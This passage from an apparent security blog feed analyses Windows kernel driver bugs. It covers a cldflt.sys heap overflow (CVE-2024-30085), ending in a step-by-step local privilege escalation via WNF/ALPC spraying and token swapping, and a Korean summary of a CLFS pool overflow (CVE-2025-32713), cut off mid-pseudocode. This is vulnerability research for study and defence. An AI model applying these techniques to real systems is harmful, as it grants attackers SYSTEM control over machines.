id="Reparse-Point-Metadata"><a href="#Reparse-Point-Metadata" class="headerlink" title="Reparse Point Metadata"></a>Reparse Point Metadata</h3><p>So, what happens when a user tries to access such a file?</p><p>NTFS checks the Reparse Tag and determines, <strong>&#x201C;Oh&#x2026; this is a stub file!&#x201D;</strong>.</p><p>At this point, the Windows Cloud Files Minifilter (<code>cldflt.sys</code>) reads the <code>Reparse Point</code> metadata structure and decides how to handle the file.</p><p>After that, the Minifilter prepares for communication with the remote server.</p><p>However, <code>cldflt.sys</code> itself does not communicate directly with the server &#x2014; instead, it delegates the actual work to a User-Mode process.</p><p>This matches the concept we saw earlier: the Minifilter plays the role of an I/O interpreter, while the User-Mode client handles the actual data manipulation.</p><p>I&#x2019;ve added the Windows Cloud Files Minifilter&#x2019;s Reparse Point structure definitions to Local Types.</p><p>Let&#x2019;s take a look at the CldFlt structure set I defined.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">REPARSE_DATA_BUFFER</span> {</span>    DWORD ReparseTag;    WORD ReparseDataLength;    WORD Reserved;    WORD Flags;    WORD UncompressedSize;    REPARSE_CLD_BUFFER ReparseCldBuffer;} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;</code></pre><p><code>REPARSE_DATA_BUFFER</code> is the standard header structure used to represent all Reparse Point data on NTFS.</p><p>Here, however, we use a redefined version to make analyzing Cloud Files easier.</p><p>This structure stores top-level metadata such as <code>ReparseTag</code> (to identify the owning driver), <code>ReparseDataLength</code>, and <code>Flags</code>, and then points to the actual data, which continues as an <code>HSM_REPARSE</code> structure.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_REPARSE</span> {</span>    USHORT hsmFlags;    USHORT hsmSize;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> <span class="hljs-title">fileData</span>;</span>};</code></pre><p><code>HSM_REPARSE</code> is the full container for a Cloud Files-specific Reparse Point.</p><p><code>hsmFlags</code> and <code>hsmSize</code> indicate whether compression is used and the total size of the HSM block.</p><p>The <code>fileData</code> field contains an <code>HSM_RP_DATA</code> structure.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> {</span>    ULONG magic;    ULONG crc32;    ULONG totalSize;    USHORT dataFlags;    USHORT elemCount;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> <span class="hljs-title">elements</span>[5];</span>};</code></pre><p><code>HSM_RP_DATA</code> is the main header, containing the layout and structure of the entire metadata block.</p><p><code>magic</code> identifies the data type, and if the CRC bit is set in <code>dataFlags</code>, <code>crc32</code> is validated using <code>RtlComputeCrc32</code>.</p><p>The <code>elements[]</code> array stores <code>HSM_RP_ELEMENT</code> structures that define the type, size, and offset of each metadata element.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> {</span>    USHORT elemType;    USHORT elemSize;    ULONG elemOffset;};<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> HSM_RP_ELEM_TYPE {    HSM_RP_ELEMENT_NONE   = <span class="hljs-number">0x00</span>,    HSM_RP_ELEMENT_U64    = <span class="hljs-number">0x06</span>,    HSM_RP_ELEMENT_BYTE   = <span class="hljs-number">0x07</span>,    HSM_RP_ELEMENT_U32    = <span class="hljs-number">0x0a</span>,    HSM_RP_ELEMENT_BITMAP = <span class="hljs-number">0x11</span>,    HSM_RP_ELEMENT_MAX    = <span class="hljs-number">0x12</span>} HSM_RP_ELEMENT_TYPE;</code></pre><p><code>HSM_RP_ELEMENT</code> defines each individual metadata element&#x2019;s type, size, and offset.</p><p>The <code>HSM_RP_ELEMENT_TYPE</code> enumeration is used to classify element types.</p><h2 id="2-1-Root-Cause-Analysis"><a href="#2-1-Root-Cause-Analysis" class="headerlink" title="2.1 Root Cause Analysis"></a>2.1 Root Cause Analysis</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image5.png" alt></p><p>The vulnerability occurs when a file is created and the <code>HsmFltPostCREATE</code> callback is executed to process the file&#x2019;s Reparse Point.</p><p>Within <code>HsmFltPostCREATE</code>, when handling the bitmap information stored in the Reparse Point, the function <code>HsmIBitmapNORMALOpen()</code> is called &#x2014; and this is where the flaw exists.</p><ul><li><code>bitmap_size</code> is read directly from the User-Mode request buffer.</li><li>A fixed-size buffer of 0x1000 bytes is allocated via <code>ExAllocatePoolWithTag</code>, but the user-controlled <code>bitmap_size</code> value is passed directly to <code>memmove</code> without any boundary checks.</li></ul><p>Therefore, if <code>bitmap_size</code> is greater than 0x1000, a Heap-based Buffer Overflow is expected to occur.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image6.png" alt></p><p>Looking at the <code>HsmpBitmapIsReparseBufferSupported()</code> function, it returns an error if <code>hdr-&gt;elements[4].elemSize</code> is greater than <code>0x1000</code>.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image7.png" alt></p><p>Looking a bit further up at the conditional statement code, we can see that <code>hdr-&gt;elements[2]</code> is being strictly validated. Checks such as <code>total &#x2265; 0x18</code> and <code>hdr-&gt;elemCount</code> boundary verification must all be passed in order to proceed. If these conditions are not met, it would return a failure, right?</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image8.png" alt></p><p>However, in the same function, if <code>hasBuf</code> is set to <code>false</code>, the code returns <code>result = 0</code> (success) simply by checking the 1-byte flag of <code>element[1]</code>, without performing any separate bitmap length validation. In this path, there is no check to determine whether the bitmap length exceeds <code>0x1000</code>, so the validation is skipped and the data is treated as valid.</p><h2 id="2-2-Exploit"><a href="#2-2-Exploit" class="headerlink" title="2.2 Exploit"></a>2.2 Exploit</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image9.png" alt></p><p>The <code>cldflt.sys</code> minifilter driver does not scan all file system I/O by default; instead, it only operates on paths within the Sync Root that are registered through the CfAPI. Therefore, the first step was to reach the root directory of a cloud sync folder by calling the <code>CfRegisterSyncRoot()</code> function.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image10.png" alt></p><p>Once the Sync Root registration code is built and executed, such a folder is created. Inside this folder, cloud stub files and metadata may appear, and this becomes the point I can exploit.</p><pre><code class="hljs c">-&gt; HsmFltPostCREATE()-&gt; HsmiFltPostECPCREATE()-&gt; HsmpSetupContexts()-&gt; HsmpCtxCreateStreamContext()-&gt; HsmIBitmapNORMALOpen()</code></pre><p>Through dynamic analysis, it was confirmed that in order to reach the vulnerable function <code>HsmIBitmapNORMALOpen()</code>, the execution must sequentially pass through the above function chain and satisfy all conditional checks. My goal, therefore, is to fulfill all those conditions and reach the vulnerable <code>memmove</code> inside <code>HsmIBitmapNORMALOpen()</code>.</p><blockquote><p>Understanding the Flow as a Minifilter Driver</p></blockquote><p>Earlier, I mentioned that a minifilter driver calls specific callbacks depending on the IRP code when an I/O request occurs. To enter the vulnerable path, the process must begin at the <code>IRP_MJ_CREATE</code> Post-Create Callback (<code>HsmFltPostCREATE</code>) and proceed sequentially to the target function. These intermediate functions validate entry conditions based on file/stream attributes and Reparse Point information, so we can bypass them by crafting a special file structure.</p><ol><li>Use <code>MakeDataBuffer()</code> to create an <code>IO_REPARSE_TAG_CLOUD</code> structure &#x2192; The minifilter recognizes the file as a cloud stub file and enters the Reparse Point parsing logic.</li><li>Set Item Tag = <code>0x11</code> (Bitmap) &#x2192; Configure <code>Size</code> to <code>0x1000 + overSize</code> to trigger a heap overflow in <code>memmove()</code> by copying more than the allocated size. Ensure that other elements (Tags <code>0x7</code>, <code>0x6</code>, <code>0xA</code>, etc.) are also set to pass the minifilter&#x2019;s boundary checks.</li><li>Include a fake kernel object pointer in the overflow data &#x2192; Apply it with <code>FSCTL_SET_REPARSE_POINT</code>, then trigger <code>HsmIBitmapNORMALOpen()</code> by calling <code>CreateFile()</code>.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image11.png" alt></p><p>When these conditions are met, we can confirm that the flow starts from <code>FltMgr</code> and reaches <code>HsmIBitmapNORMALOpen()</code>.</p><p>I&#x2019;d like to cover the full exploit process, but since today&#x2019;s focus is on explaining the minifilter and I&#x2019;ve already gone overboard with the length&#x2026; let&#x2019;s wrap up with a summary of the entire exploit scenario.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image12.png" alt></p><blockquote><p>Proof of Concept Overview</p></blockquote><ol><li><p><strong>EPROCESS Structure Analysis and Token Field Offset Calculation</strong></p><p> Calculate the offset of the Token field within the EPROCESS structure to prepare for the subsequent SYSTEM token swap.</p></li><li><p><strong>First <code>WNF_STATE_DATA</code> Spray and Hole Creation</strong></p><p> Mass-allocate (<code>spray</code>) <code>WNF_STATE_DATA</code> objects of size 0x1000 (0xff0 data) and then free them to create heap holes in the kernel heap.</p></li><li><p><strong>Open Vulnerable Bitmap File and Trigger First Overflow</strong></p><p> Use <code>CfRegisterSyncRoot()</code> and manipulate the Reparse Point directory to prepare a vulnerable bitmap file within the Sync Root. Then, open the file with <code>CreateFile()</code> to reach the path:</p><p> <code>IRP_MJ_CREATE()</code> &#x2192; <code>HsmFltPostCREATE()</code> &#x2192; <code>HsmiFltPostECPCREATE()</code> &#x2192; <code>HsmpSetupContexts()</code> &#x2192; <code>HsmpCtxCreateStreamContext()</code> &#x2192; <code>HsmIBitmapNORMALOpen()</code></p><p> Trigger a heap overflow to modify the <code>DataSize</code> of an adjacent <code>WNF_STATE_DATA</code>, gaining OOB (Out-of-Bounds) read/write capability.</p></li><li><p><strong>Kernel Pointer Leak</strong></p><p> Use the modified <code>WNF_STATE_DATA</code> to read the <code>_KALPC_RESERVE</code> pointer and leak a kernel address.</p></li><li><p><strong>Second <code>WNF_STATE_DATA</code> Spray and Hole Creation</strong></p><p> Repeat the same spray-and-free process for <code>WNF_STATE_DATA</code> objects, but this time arrange for a <code>PipeAttribute</code> structure to be placed adjacent to the WNF object.</p></li><li><p><strong>Second Overflow to Manipulate <code>PipeAttribute</code></strong></p><p> Open a second bitmap file to trigger another heap overflow, overwriting the <code>Flink</code> pointer of the adjacent <code>PipeAttribute</code> with the address of a user-space fake <code>PipeAttribute</code> structure.</p></li><li><p><strong>Arbitrary Read to Retrieve EPROCESS/Token Addresses</strong></p><p> Use the fake <code>PipeAttribute</code> to access the ALPC Port structure, sequentially reading the EPROCESS address and Token address of the target process.</p></li><li><p><strong>Token Swapping and SYSTEM Privilege Escalation</strong></p><p> Perform an arbitrary write to replace the current process&#x2019;s Token value with the SYSTEM Token value, then launch <code>cmd.exe</code> with SYSTEM privileges.</p></li></ol><h3 id="ALPC-WNF"><a href="#ALPC-WNF" class="headerlink" title="ALPC / WNF"></a>ALPC / WNF</h3><p>The <code>_WNF_STATE_DATA</code> and <code>_ALPC_HANDLE_TABLE</code> structures are used to allocate arbitrary-sized kernel objects for heap holes and to leak kernel memory addresses. Since ALPC and WNF might be unfamiliar concepts, here is a brief explanation of the two subsystems relevant to this exploit:</p><blockquote><p><strong>ALPC (Asynchronous Local Procedure Call)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image13.webp" alt></p><p>ALPC is an inter-process communication (IPC) mechanism within the Windows kernel that uses client and server ports to exchange messages. By leveraging the <code>_ALPC_HANDLE_ENTRY</code> in the ALPC handle table, it is possible to store message buffer addresses. Since the size of this table is variable, it allows the creation of kernel objects of arbitrary size.</p><ul><li>When an ALPC port is created, an <code>_ALPC_HANDLE_TABLE</code> is allocated in the <strong>paged pool</strong> with a size of 0x80.</li><li>Each call to <code>NtAlpcCreateResourceReserve</code> creates a <code>_KALPC_RESERVE</code> object, and its address is added to the handle table.</li><li><p>By tampering with this structure, it becomes possible to obtain arbitrary kernel address read/write primitives.</p><p>  &#x2192; In the PoC, a fake <code>_KALPC_RESERVE</code> is injected to achieve arbitrary R/W.</p></li><li><p>ALPC handles can also be controlled from user mode, making them highly useful for exploitation.</p></li></ul><blockquote><p><strong>WNF (Windows Notification Facility)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image14.webp" alt></p><p>WNF is the Windows Notification Facility, and the <code>WNF_NAME_INSTANCE</code> kernel object contains an internal <code>_WNF_STATE_DATA</code> field whose size is variable. This allows direct control of the kernel object size from user mode using <code>NtCreateWnfStateName</code> + <code>NtUpdateWnfStateData</code>.</p><ul><li><code>_WNF_STATE_DATA</code> can be allocated with a size of 0x1000 (0x10 header + 0xFF0 data).</li><li>WNF objects can be mass-created for heap spraying, placing them adjacent to a target structure (e.g., an ALPC object).</li><li>In the PoC, WNF is used to create heap holes and then place them next to ALPC objects to trigger an overflow into the ALPC handle table.</li></ul><p>In particular, the PoC required registering a routine to create a pipe, which I found interesting.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeAttribute</span> {</span>    LIST_ENTRY <span class="hljs-built_in">list</span>;    <span class="hljs-keyword">char</span> *AttributeName;    <span class="hljs-keyword">uint64_t</span> AttributeValueSize;    <span class="hljs-keyword">char</span> *AttributeValue;    <span class="hljs-keyword">char</span> data[<span class="hljs-number">0</span>];};</code></pre><p>The pipe is configured so that the <code>AttributeValue</code> pointer in the modified <code>PipeAttribute</code> structure is set to a kernel memory address. This causes the kernel to read data from that address and return it to user mode. By combining the memory layout control achieved via ALPC with the WNF overflow, the pipe can be turned into an arbitrary read primitive, allowing leakage of kernel addresses.</p><h1 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a>3. Conclusion</h1><hr><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image15.gif" alt></p><p>I&#x2019;ll wrap up by sharing the results of the LPE I implemented using the characteristics of the <code>cldflt.sys</code> Minifilter driver combined with the WNF + ALPC technique.</p><p>While studying Minifilters, I realized that although their operation, functions, and concepts may feel a bit unfamiliar, the way vulnerabilities are triggered and their root causes are, in the end, quite similar. So, there&#x2019;s no need to be too intimidated about diving into Minifilter exploitation!</p><p>If I get the chance, I&#x2019;d like to explore and study various other drivers I haven&#x2019;t looked into yet. I hope you&#x2019;ll look forward to my next write-up as well!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h1><hr><p><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/</a></p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts</a></p><p><a href="https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/">https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/">https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/</a></p><p><a href="https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true">https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true</a></p><p><a href="https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6">https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-30085/">CVE-2024-30085</category>
      
      <category domain="https://hackyboiz.github.io/tags/CldFlt/">CldFlt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025–32713: Windows Common Log File System Driver Local Privilege Escalation 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/</link>
      <guid>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/</guid>
      <pubDate>Wed, 13 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/s2wblog/analysis-of-windows-comm</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54">https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 6&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xC804; clfs.sys &#xD30C;&#xC77C;<ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32713">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32713</a></li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Common Log File System&#xC5D0;&#xC11C; Pool Overflow&#xB85C; &#xC778;&#xD55C; LPE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8; &#xBE14;&#xB85D;(Log Block)&#xC744; &#xC77D;&#xC744; &#xB54C; ClfsContextForward&#xAC00; &#xC544;&#xB2CC; &#xB2E4;&#xB978; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xBAA8;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0;, &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(Logical Sector Size)&#xAC00; 512byte&#xBCF4;&#xB2E4; &#xD070; &#xBCFC;&#xB968;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; CLFS&#xC5D0;&#xC11C; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC804; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB97C; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;(Log Marshalling Area) &#xC0DD;&#xC131;</strong><ul><li><code>CreateLogMarshallingArea</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xB2F9; &#xC601;&#xC5ED;&#xC740; &#xB85C;&#xADF8; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC62E;&#xAE30;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC791;&#xC5C5; &#xACF5;&#xAC04; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC; &#xC77D;&#xAE30;</strong><ul><li>&#xC774;&#xD6C4;, <code>ReadLogRecord</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC758; &#xD578;&#xB4E4;&#xACFC; &#xC77D;&#xACE0; &#xC2F6;&#xC740; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xC758; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;(Log Sequence Number)&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC5EC;&#xAE30;&#xC11C; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;&#xB294; &#xB85C;&#xADF8; &#xB370;&#xC774;&#xD130; &#xBA87; &#xBC88;&#xC9F8;&#xB97C; &#xC77D;&#xC744;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xBC88;&#xD638;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a><strong>Root Cause</strong></h3><p>CLFS &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xD30C;&#xC77C; &#xB0B4;&#xC5D0; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xC744; &#xB54C;, <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Pseudo code of CClfsLogFcbPhysical::ReadLogBlock function</span><span class="hljs-comment">// Execution flows not related to the bug are omitted.</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsLogFcbPhysical::ReadLogBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        CClfsLogFcbPhysical *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        struct _FILE_OBJECT *CachedFileObject,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">union</span> _CLS_LSN *a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct _CLFS_READ_BUFFER *a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        struct IClfsRequestAsync *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN *a9,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a10)</span></span><span class="hljs-function"></span>{  ...  **v75 = a4;**  ...  **<span class="hljs-comment">// Get sector size of the volume which contains log container**</span>  **<span class="hljs-comment">// This value is set during execution of CClfsBaseFilePersisted::OpenImage function**</span>  **_ContainerRawSectorSize = <span class="hljs-keyword">this</span>-&gt;BaseFilePersisted-&gt;ContainerRawSectorSize;**  **ContainerRawSectorSize = _ContainerRawSectorSize;**  ...  **v64 = *(_OWORD *)a5;**  ...  Address = (struct _CLFS_LOG_BLOCK_HEADER *)_CLFS_READ_BUFFER::GetAddress(a5);  ...  <span class="hljs-keyword">if</span> ( Address )  {    **Buffer = _CLFS_READ_BUFFER::GetAddress((_CLFS_READ_BUFFER *)&amp;v64);**    <span class="hljs-keyword">if</span> ( Buffer )    {      ...      <span class="hljs-keyword">if</span> ( (_BYTE)v52        || CachedFileObject-&gt;PrivateCacheMap        || (v13 = (*(__int64 (__fastcall **)(CClfsLogFcbPhysical *, struct _FILE_OBJECT *, CClfsLogFcbPhysical *))<span class="hljs-keyword">this</span>-&gt;field_0)(                    <span class="hljs-keyword">this</span>,                    CachedFileObject,                    <span class="hljs-keyword">this</span>),            v13 &gt;= <span class="hljs-number">0</span>) )      {        ...        <span class="hljs-keyword">if</span> ( (*(<span class="hljs-keyword">unsigned</span> __int8 (__fastcall **)(CClfsLogFcbPhysical *))(<span class="hljs-keyword">this</span>-&gt;field_0 + <span class="hljs-number">312</span>))(<span class="hljs-keyword">this</span>) &amp;&amp; (a8 &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )        {          ...        }        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">this</span>-&gt;field_168 &amp; <span class="hljs-number">0x100000000000</span>i64) != <span class="hljs-number">0</span> )        {          ...        }        <span class="hljs-keyword">else</span>        {          ...          <span class="hljs-keyword">if</span> ( a3 &amp;&amp; a3-&gt;ullOffset &lt; (<span class="hljs-keyword">unsigned</span> __int64)v20 )          {            ...          }          <span class="hljs-keyword">else</span>          {            ...            <span class="hljs-keyword">if</span> ( !(<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-keyword">operator</span>&gt;=(a3, &amp;<span class="hljs-keyword">this</span>-&gt;field_1E0) )            {              ...              <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )              {                ...                <span class="hljs-keyword">if</span> ( **(v75 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>** ) **<span class="hljs-comment">// [1] Check the fourth argument**</span>                {                  v45 = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">if</span> ( !*a10 ) **<span class="hljs-comment">// It is true when entering the loop for the first time**</span>                  {                    **Length = ContainerRawSectorSize; <span class="hljs-comment">// Set Length as sector size**</span>                    ...                  }                }                <span class="hljs-keyword">if</span> ( (_BYTE)v52 )                {                  ...                }                <span class="hljs-keyword">else</span>                {                  ...                  <span class="hljs-keyword">if</span> ( FileOffset.HighPart &lt; <span class="hljs-number">0</span> || v34 &lt; <span class="hljs-number">0</span> )                    ...                  <span class="hljs-keyword">if</span> ( v34 &lt; v33.QuadPart + Length )                  {                    ...                  }                  v59.ullOffset = <span class="hljs-number">0</span>i64;                  <span class="hljs-keyword">if</span> ( v33.QuadPart &lt; <span class="hljs-number">0</span>                    || (<span class="hljs-keyword">int</span>)RtlLongLongAdd(v33.QuadPart, Length, (__int64 *)&amp;v59) &lt; <span class="hljs-number">0</span>                    || (__int64)v59.ullOffset &gt; <span class="hljs-keyword">this</span>-&gt;field_50 )                  {                    ...                  }                  <span class="hljs-comment">// [2] **Pool overflow will occur if Length (sector size) is larger than the size of Buffer**</span>                  <span class="hljs-keyword">if</span> ( **CcCopyRead**(CachedFileObject, &amp;FileOffset, **Length**, <span class="hljs-number">1u</span>, **Buffer**, &amp;IoStatus) )                  {                    ...                  }[...]</code></pre><p><code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>[1] &#xB85C;&#xADF8; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xAC00; &#xC788;&#xB294; &#xBCFC;&#xB968;&#xC758; &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xB97C; Length &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. [2] <code>CcCopyRead</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; Length &#xBCC0;&#xC218; &#xAC12;(&#xC139;&#xD130; &#xD06C;&#xAE30;)&#xB9CC;&#xD07C; &#xB370;&#xC774;&#xD130;&#xB97C; Buffer&#xC5D0; write &#xD558;&#xB294;&#xB370; &#xC774;&#xB54C;, Length(&#xC139;&#xD130; &#xD06C;&#xAE30;)&#xAC00; Buffer&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; Pool Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Pseudo code of CClfsRequest::ReadLogBlock function</span><span class="hljs-comment">// Execution flows not related to output buffer size constraints are omitted.</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsRequest::ReadLogBlock</span><span class="hljs-params">(CClfsRequest *<span class="hljs-keyword">this</span>)</span></span><span class="hljs-function"></span>{  ...  v2 = *(_QWORD *)(*((_QWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">6</span>) + <span class="hljs-number">184</span>i64);  nOutBufferSize = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(v2 + <span class="hljs-number">8</span>);  *((_DWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">66</span>) = nOutBufferSize;  <span class="hljs-comment">// **Check OutBufferSize constraints**</span>  <span class="hljs-comment">// **It does not prevent pool overflow when sector size is larger than 512 bytes**</span>  <span class="hljs-keyword">if</span> ( **(<span class="hljs-keyword">unsigned</span> <span 